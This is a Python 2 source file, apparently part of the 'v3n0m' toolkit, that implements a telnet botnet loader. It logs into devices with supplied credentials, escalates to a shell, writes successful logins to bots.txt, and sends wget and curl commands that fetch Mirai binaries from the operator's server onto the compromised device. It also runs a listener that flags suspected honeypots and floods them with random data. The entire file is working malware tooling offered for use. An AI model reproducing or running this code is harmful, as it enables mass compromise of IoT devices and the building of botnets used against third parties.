#!/usr/bin/python
# -*- coding: UTF-8 -*-
# This file is part of v3n0m
# See LICENSE for license details.
# Phaaaat hax telnet loader by Freak (credit for inspiration)
# Only change this if you know what exactly it does!
# Uses a keep-alive connection and can be traced!
# In other words, don't do this at home. (Do it at Starbucks.)

import sys, re, os, socket, time, select
from threading import Thread

yourserverip = "0.0.0.0" 
rekdevice = """paste update.sh/bins.sh here""".replace("\r", "").split("\n")

global fh
fh = open("bots.txt","a+")

def chunkify(lst,n):
    return [ lst[i::n] for i in xrange(n) ]

running = 0

global echo
global tftp
global wget
global logins
global echoed
echoed = []
tftp = 0
wget = 0
echo = 0
logins = 0
ran = 0

# Print continuous list
def printStatus():
    global echo
    global tftp
    global wget
    global logins
    global ran
    while 1:
        time.sleep(5)
        print "\033[32m[\033[31m+\033[32m] Logins: " + str(logins) + "     Ran:" + str(ran) + "  Echoes:" + str(echo) + " Wgets:" + str(wget) + " TFTPs:" + str(tftp) + "\033[37m"

# Buffer sequence
def readUntil(tn, advances, timeout=8):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        for advance in advances:
            if advance in buf: return buf
    return ""

# Move on if socket times out
def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

def contains(data, array):
    for test in array:
        if test in data:
            return True
    return False

def split_bytes(s, n):
    assert n >= 4
    start = 0
    lens = len(s)
    while start < lens:
        if lens - start <= n:
            yield s[start:]
            return # StopIteration
        end = start + n
        assert end > start
        yield s[start:end]
        start = end
global badips
global goodips
badips=[]
goodips=[]

def fileread():
    fh=open("honeypots.txt", "rb")
    data=fh.read()
    fh.close()
    return data
def clientHandler(c, addr):
    global badips
    global goodips
    try:
        if addr[0] not in badips and addr[0] not in fileread():
            print addr[0] + ":" + str(addr[1]) + " has connected!"
            request = recvTimeout(c, 8912)
            if "curl" not in request and "Wget" not in request:
                if addr[0] not in fileread():
                    fh=open("honeypots.txt", "a")
                    fh.write(addr[0]+"\n")
                    fh.close()
                badips.append(addr[0])
                print addr[0] + ":" + str(addr[1]) + " is a fucking honeypot!!!"
                c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
                for i in range(10):
                    c.send(os.urandom(65535*2))
            else:
                if addr[0] not in goodips:
                    print addr[0] + ":" + str(addr[1]) + " is a good IP!"
                    goodips.append(addr[0])
        else:
            c.send("fuck you GOOF HONEYPOT GET OUT\r\n")
            for i in range(10):
                c.send(os.urandom(65535*2))
        c.close()
    except Exception as e:
        #print str(e)
        pass

def honeyserver():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 8081))
    s.listen(999999999)
    while 1:
        try:
            c, addr = s.accept()
            Thread(target=clientHandler, args=(c, addr,)).start()
        except:
            pass

Thread(target=honeyserver, args=()).start()
def infect(ip, username, password):
    global badips
    global goodips
    global echo
    global tftp
    global wget
    global logins
    global ran
    global echoed
    if ip in echoed:
        return
    infectedkey = "bigB04t"
    try:
        tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        tn.settimeout(1)
        tn.connect((ip, 23))
    except:
        try:
            tn.close()
        except:
            pass
        return
    try:
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(username + "\n")
            time.sleep(0.1)
        hoho = ''
        hoho += readUntil(tn, ":")
        if ":" in hoho:
            tn.send(password + "\n")
            time.sleep(0.8)
        else:
            pass
        prompt = ''
        prompt += recvTimeout(tn, 8192)
        if ">" in prompt and "ONT" not in prompt:
            success = True
        elif "#" in prompt or "$" in prompt or "@" in prompt or ">" in prompt:
            success = True
        else:
            tn.close()
            return
    except:
        tn.close()
        return
    if success == True:
        try:
            tn.send("enable\r\n")
            tn.send("system\r\n")
            tn.send("shell\r\n")
            tn.send("sh\r\n")
            tn.send("echo -e '\\x41\\x4b\\x34\\x37'\r\n")
        except:
            tn.close()
            return
        time.sleep(1)
        try:
            buf = recvTimeout(tn, 8192)
        except:
            tn.close()
            return
        try:
            if "AK47" in buf:
                logins += 1
                fh.write(ip + ":23 " + username + ":" + password + "\n")
                fh.flush()
                tn.send("wget http://" + yourserverip + "/mirai.arm &\r\n");
                tn.send("curl http://" + yourserverip + ":8081/mirai.arm &\r\n");
                time.sleep(3)
                recvTimeout(tn, 8192)
                if ip in goodips:
                    tn.send(rekdevice)
                tn.close()
        except Exception as e:
            #print str(e)
            pass
                
    else:
#        tn.close()
        return

def check(chunk, fh):
    global running
    running += 1
    threadID = running
    for login in chunk:
        try:
            if ":23 " in login:
                login = login.replace(":23 ", ":")
                port = 23
            if ":2323 " in login:
                login = login.replace(":2323 ", ":")
                port = 2323
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            try:
                socket.inet_aton(login.split(":")[0])
                ip = login.split(":")[0]
                username = login.split(":")[1]
                password = login.split(":")[2]
            except:
                try:
                    socket.inet_aton(login.split(":")[2])
                    ip = login.split(":")[2]
                    username = login.split(":")[0]
                    password = login.split(":")[1]
                except:
                    continue
            s.connect((ip, port))
            s.close()
            infect(ip, username, password)
        except:
            pass
    running -= 1
while 1:
    try:
        while running >= 256:
            time.sleep(0.3)
        Thread(target = check, args = ([raw_input()], fh,)).start()
    except KeyboardInterrupt:
        os.kill(os.getpid(), 9)
    except Exception:
        pass